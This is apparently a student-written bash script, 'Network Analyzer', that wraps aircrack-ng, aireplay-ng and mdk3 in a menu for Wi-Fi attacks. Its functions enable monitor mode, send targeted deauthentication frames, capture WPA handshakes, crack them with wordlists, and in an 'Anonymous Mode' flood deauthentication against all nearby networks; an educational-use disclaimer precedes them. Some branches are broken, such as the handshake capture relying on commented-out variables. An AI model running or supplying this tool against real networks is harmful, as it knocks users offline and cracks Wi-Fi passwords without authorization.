#!/bin/bash
VERSION="2024.06.24"

# Define color variables
R='\033[0;31m'
G='\033[0;32m'
Y='\033[0;33m'
NC='\033[0m' # No Color

# Function to display version
display_version() {
    echo -e "${G}NETWORK ANALYSER v${NC}${Y}$VERSION${NC}"
    exit 0
}

# Check for --version argument
if [[ $1 == "--version" ]]; then
    display_version
fi

# Function to check for root permissions
checkpermissions() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${R}This script requires ${G}root privileges${NC}. Please run it as ${Y}ROOT.${NC}"
        echo -e "${G}EXAMPLE: sudo bash mybash.sh${NC}"
        exit 1
    fi
}
# Check for root permissions
checkpermissions

echo""
echo -e "${R}ROOT ${G}PERMISSION GRANTED${NC}"
echo ""
echo -e "${R}**** WELCOME TO ${G}NETWORK ANALYZER v${Y}$VERSION${NC}${R} ****${NC}"
echo -e "${Y} !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ${NC}"
echo -e "${R}   This script is only for educational purposes.${NC}
${G}    Use it only with proper permission!${NC}"
echo -e "${Y} !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ${NC}"
compatible_distros=("Arch" "Backbox" "BlackArch" "CentOS" "Cyborg" "Debian" "Fedora" "Gentoo" "Kali" "Kali arm" "Mint" "OpenMandriva" "Parrot" "Parrot arm" "Pentoo" "Raspberry Pi OS" "Raspbian" "Red Hat" "Ubuntu")

# Function to check if the current distribution is compatible
compatible_distro() {
    current_distro=$(lsb_release -si)
    echo -e "${Y}Detecting System ${R}...${NC}"
    if [[ " ${compatible_distros[@]} " =~ " ${current_distro} " ]]; then
        echo -e "${Y}FOUND: ${G}$current_distro${NC}"
    else
        echo "WARNING: Your distro may not be officially supported by this script."
    fi
}

# Check compatible distribution
compatible_distro
echo ""
echo -e "${Y}Checking Requirement${R}...${NC}"
# List of tools to check
tools=("aircrack-ng" "airmon-ng" "airodump-ng" "mdk3" "mdk4" "aireplay-ng")

# Function to display a loading message
loading() {
    local delay=0.1
    local spin='-\|/'
    while true; do
        local temp=${spin#?}
        printf " [%c]  " "$spin"
        local spin=$temp${spin%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
}

echo ""
#this check if each tool is installed
for tool in "${tools[@]}"; do
    echo -e "${Y}Checking for${NC} ${G}$tool${NC}..."
    if ! command -v "$tool" &>/dev/null; then
        echo "Not Found"
    else
        echo -e "${Y}Ok${NC}"
    fi
    loading &
    loading_pid=$!
    sleep 2
    kill $loading_pid
    wait $loading_pid 2>/dev/null
    echo ""
done
echo""
# Print the banner with colors centeR on the screen
echo -e "${G}^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
echo -e "${G}                                                                   ${Y}B${NC}        "
echo -e "${G}    ██████████          ██████        ████████████████████         ${Y}C${NC}        "
echo -e "${G}    ███████████         ██████       ██████████████████████        ${Y}A${NC}        " 
echo -e "${G}    ███████ ████        ██████       ██████         ███████                          "
echo -e "${G}    ███████  ████       ██████       ██████         ███████     ${Y}5th${NC}         "
echo -e "${G}    ███████   █████     ██████       ██████         ███████                          "
echo -e "${G}    ███████    █████    ██████       ██████████████████████     ${Y}S | 2 |${NC}     "
echo -e "${G}    ███████     █████   ██████       ██████████████████████     ${Y}E | 0 |${NC}     "
echo -e "${G}    ███████      █████  ██████       ██████         ███████     ${Y}M | 2 |${NC}     "
echo -e "${G}    ███████       █████ ██████       ██████         ███████     ${Y}  | 4 |${NC}     "
echo -e "${G}    ███████        ███████████       ██████         ███████     ${Y}P${NC}           "
echo -e "${G}    ███████         ██████████       ██████         ███████     ${Y}J${NC}           "
echo -e "${G}                                                                                     "
echo -e "${G}                ${Y}NETWORK ANALYZER v${R}$VERSION${NC}    ${Y}- ${R}AZ_SEP${NC}     "
echo -e "${R}                        SYSTEM ${G}$current_distro${NC}                              "
echo -e "${G}^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
echo -e "${NC}"

#Required tools
echo -e "${G} _______________${NC}"
echo -e "${G}|${R}REQUIRED TOOLS:${G}|${NC}"
echo -e "${G}|${NC}1. ${Y}aircrack-ng ${G}|${NC}"
echo -e "${G}|${NC}2. ${Y}airmon-ng   ${G}|${NC}"
echo -e "${G}|${NC}3. ${Y}airodump-ng ${G}|${NC}"
echo -e "${G}|${NC}4. ${Y}aireplay-ng ${G}|${NC}"
echo -e "${G}|${NC}5. ${Y}BCA-crack   ${G}|${NC}"
echo -e "${G}|_______________|${NC}"
echo ""
echo -e "This tools require ${R}ADMIN${NC} previlge"
echo""

# Array of interfaces names to check
interfaces=("wlp2s0" "wlan0" "wlan1" "wlan2" "lo0" "wlp2s0mon" "wlan0mon" "wlan1mon" "wlan2mon" "lo0mon") # Define your interfaces
interfaces_found=0

# Iterate through the array and check if each interfaces exists
for interfaces in "${interfaces[@]}"; do
    if ip link show "$interfaces" &>/dev/null; then
        echo -e "${Y}WLAN interfaces found:${G} $interfaces ${NC}"
        interfaces_found=1
        break  # Exit the loop if any interfaces is found
    fi
done

# If none of the interfacess are found
if [ "$interfaces_found" -eq 0 ]; then
    echo -e "${R}No WLAN interfaces found${NC}"
fi

#python server to host the webpage
# Function to check if a command exists
command_exists() {
    command -v "$1" &> /dev/null
}

# Function to run the Python server
runserver() {
    local server_script=$1

    if command_exists gnome-terminal; then
        gnome-terminal -- python3 "$server_script"
    elif command_exists xterm; then
        xterm -e python3 "$server_script"
    elif command_exists konsole; then
        konsole -e python3 "$server_script"
    else
        echo -e "${Y}No compatible terminal emulator found. Running the server in the current terminal...${NC}"
        python3 "$server_script"
    fi
}

# Main script execution
SERVER_SCRIPT="server.py"

echo -e "${G}Starting Python server...${NC}"
echo -e "${Y}${SERVER_SCRIPT}${NC}"
runserver "$SERVER_SCRIPT"
#variable that store a string
printinfo="Enter any key to exit to main MENU "
moninfo="This tools required MONITORING MODE"
monalert="If ${Y}{monmon}${NC} appear after ${R}$interfaces${NC}${Y} Disable Monitor Mode and ${G}RESTART${NC}
       ${R} or used sudo airodump-ng stop ${interfaces}${NC}"

# Function to enable monitor mode 
enable_monitor_mode() {
    echo -e "1. ${Y}Enable Monitor Mode${NC}"
    echo -e "2. ${Y}Check Network Status${NC}"
    echo ""
    echo -e "${G}$printinfo${NC}"
    echo ""
    read -p "$(echo -e ${G}Enter your choice: ${NC})" option
    case $option in
        1)
            echo -e "${G} current interfaces is ${R} $interfaces${NC}"
            echo -e "${G} Starting Monitoring Mode${Y}..${NC}${Y}"
            sudo airmon-ng start $interfaces
            echo -e "${NC}"
            ;;
        2)
            echo -e "${Y}"
            sudo systemctl status NetworkManager
            echo -e "${NC}"
            ;;
        *)
        echo -e "${R} invalid option ${NC}"
        ;;
    esac
}
# Function to disable monitor mode
disable_monitor_mode() {
    echo -e "${R}Disabling monitoring mode${NC}${Y}..."
    sudo airmon-ng stop $interfaces
    echo -e "${R}$monalert${NC}"
    echo ""
    echo -e "${NC}${R}WARNING: ${G}If the given interfaces $interfaces does not exist, please check your Network Interface${NC}"
}
# Function for network deauthentication
network_deauthentication() {
    echo -e "${R}$moninfo${NC}"
    echo ""
    echo "Deauth option:"
    echo -e "1. ${Y}Discover Network${NC}"
    echo -e "2. ${Y}Manual Mode${NC}"
    echo ""
    echo -e "${G}$printinfo${NC}"
    echo ""
    read -p "$(echo -e ${G}Enter your choice: ${NC})" option
    case $option in
        1)
            echo -e "${Y}Entering Network Discovering Mode${NC}${Y}...${NC}"
            echo ""
            echo -e "${Y}Enter Network interfaces (${G}default is${NC}${R} $interfaces${NC}):"
            read Netinterfaces
            if [ -z "$Netinterfaces" ];
            then
                Netinterfaces="$interfaces"
            fi
            echo -e "${R} Discovering..."
            echo ""
            mkdir -p SaveData
            sudo airodump-ng --output-format csv -w "$(pwd)/SaveData/" "${interfaces}mon"
            echo -e "${R}$monalert${NC}"
            echo -e "${Y}Data exported${NC}"
            echo ""
            ;;
        2)
            echo -e "${Y}Entering Manual Mode${NC}..."
            echo -e "${Y}Enter AP MAC / BSSID address to find target:${NC}"
            read hostmac
            echo -e "${Y}Enter Channel no.(CH):${NC}"
            read channel
            sudo airodump-ng --bssid $hostmac -c $channel ${interfaces}mon
            echo -e "${G} enter target details:${NC}"
            echo -e "${Y}Enter AP MAC / BSSID address:${NC}"
            read hostmac
            echo -e "${Y}Enter Client MAC / BSSID address:${NC}"
            read clientmac
            echo -e "${Y}Enter Number of deauthentication${NC}"
            echo -e "${Y}Enter 0 for auto${NC}${G}" 
            read deauthno
            sudo aireplay-ng -0 $deauthno -a "$hostmac" -c "$clientmac" ${interfaces}mon
            echo -e "${R}$monalert${NC}"
            echo -e "${NC}"
        ;;
        *)
            echo -e "${R} invalid option ${NC}"
        ;;
    esac
}
# Function for capturing handshake
capture_handshake() {
    echo -e "${R}Entering Capturing Mode..${NC}"
    echo -e "1.${Y} Manual Mode${NC}"
    echo -e "2.${Y} Select Available Network${NC}"
    echo ""
    echo -e "${R}$printinfo${NC}"
    echo ""
    read -p "$(echo -e ${G}Enter your choice: ${NC})" option
    case $option in
        1)
            echo -e "${R}Used OPTION 2 To Discover Networks${NC}"
            echo ""
            echo -e "${Y}Enter channel${NC}:"
            read channel
            echo -e "${Y}Enter AP MAC / BSSID address${NC}:"
            read ap_mac
            echo -e "${Y}Enter output file name (without extension)${NC}:"
            read outputfile
            echo -e "${R}Enter valid details!${NC}${Y}"
            sudo airodump-ng --bssid "$ap_mac" -c "$channel" -w "$outputfile" ${interfaces}mon
            echo -e "${R}$monalert${NC}"
            echo "${NC}"
        ;;
        2)
            #Scan for Available Networks and Capture Handshake
            #echo "Scanning for available networks..."
            #sudo airmon-ng start ${interfaces}mon
            sudo airodump-ng ${interfaces}mon
            echo -e "${R}$monalert${NC}"
            #|tee capture_available_net.txt
            #Extract the BSSID and Channel of the Strongest Network
            #bssid=$(grep -o -E "([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})" scan_results.txt | head -n 1)
           # channel=$(grep -o -E "Channel: [0-9]+" scan_results.txt | head -n 1 | cut -d' ' -f2)
            #Capture the Handshake for the Strongest Network
            if [ -n "$bssid" ] && [ -n "$channel" ]; then
                echo -e "${Y}Capturing handshake for the strongest network${NC}..."
                echo -e "${Y}Output file name (without extension)${NC}:${Y}"
                read outputfile
                sudo airodump-ng --bssid $bssid -c $channel -w $outputfile ${interfaces}mon
                echo -e "${NC}${R}$monalert${NC}"
            else
                echo -e "${R}No networks found. ${Y}Exiting${NC}..."
            fi
            # Cleanup: Remove the scan results file
           # rm -f scan_results.txt
        ;;
        *)
            #if input is invalid
            echo -e "${R} invalid option ${NC}"
        ;;
    esac  
}

# Function for encryption vulnerability testing
encryption_vulnerability_testing() {
    echo -e "${Y}Enter AP MAC address${NC}:"
    read ap_mac
    echo -e "${Y}Enter handshake file name (without extension)${NC}:"
    read handshake_file
    echo -e "${Y}Enter wordlist file name (including path if not in current directory)${NC}:${Y}"
    read wordlist
    sudo aircrack-ng -w "$wordlist" -b "$ap_mac" "$handshake_file.cap"
    echo -e "${NC}"
}

# Function for network monitoring
network_monitoring() {
    echo -e "${Y}Enter Network Interface(default is:${G} $interfaces)${NC} ${Y}"
    read Netinterfaces
        if [ -z "$Netinterfaces" ];
    then
        Netinterfaces="$interfaces"
    fi
    echo -e "${R}$moninfo${NC}"
    sudo airodump-ng ${interfaces}mon
    echo -e "${NC}${R}$monalert${NC}"
}

# Function for anonymous mode
anonymous_mode() {
    echo -e "${Y}Entering anonymous mode${NC}..."
    echo ""
    echo -e "${R}$moninfo${NC}"
    echo -e "${Y}Selected ${G}$interfaces ${Y}Network Interface"
    echo ""
    # Deauthenticate clients from all available networks
    sudo mdk3 ${interfaces}mon d
    echo -e "${NC}${R}$monalert${NC}"
    echo -e "${G}Process completed${NC}"
}
# Function for password cracking
password_cracking() {
    echo -e "${Y}Entering Password cracking${NC}..."
    echo -e "${Y}Password list is available at ${G}/Final/vulnerability/..txt${NC}"
    echo -e "1.${Y} Brute Force${NC}"
    echo -e "2.${Y} BCA-cracker${NC}"
    echo ""
    echo -e "${G}$printinfo${NC}"
    echo ""
    read -p "$(echo -e ${G}Enter your choice: ${NC})" option
    case $option in
        1)
            echo -e "${Y}Starting Brute Force attack${NC}..."
            echo -e "${Y}Enter Directory for Handshake File${NC}:"
            read directory
            echo -e "${Y}Enter wordlist file name (including path if not in current directory)${NC}:${Y}"
            read wordlist
            outputfile="passwdcracking_out"
            sudo aircrack-ng  "$directory" -w "$wordlist" "$outputfile"
            echo -e "${NC}"
            ;;
        2)
            echo -e "${Y}Starting BCA cracker attack${NC}..."
            echo -e "${R}DEVELOPING${NC}"
            ;;
        *)
            echo -e "${R} invalid option ${NC}"
            ;;
    esac
}

# Main menu
while true; do
    echo ""
    echo -e "${Y}Select an option:${NC}"
    echo -e "1. ${G} Enable Monitor Mode${NC}"
    echo -e "2. ${G} Disable Monitor Mode${NC}"
    echo -e "3. ${G} Network Deauthentication${NC}"
    echo -e "4. ${G} Capture Handshake${NC}"
    echo -e "5. ${G} WiFi Network Encryption Vulnerability Testing${NC}"
    echo -e "6. ${G} Network Monitoring${NC}"
    echo -e "7. ${G} Anonymous Mode${NC}"
    echo -e "8. ${G} Password Cracking (BF & G-crack)${NC}"
    echo -e "9. ${R}Exit${NC}"
    echo -e ""
    echo -e "${R}Ctl + C to exit the process${NC}"
    read -p "$(echo -e ${G}Enter your choice: ${NC})" choice
    echo ""
    case $choice in
        1)
            enable_monitor_mode
            ;;
        2)
            disable_monitor_mode
            ;;
        3)
            network_deauthentication
            ;;
        4)
            capture_handshake
            ;;
        5)
            encryption_vulnerability_testing
            ;;
        6)
            network_monitoring
            ;;
        7)
            anonymous_mode
            ;;
        8)
            password_cracking
            ;;
        9)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option"
        ;;
    esac
done
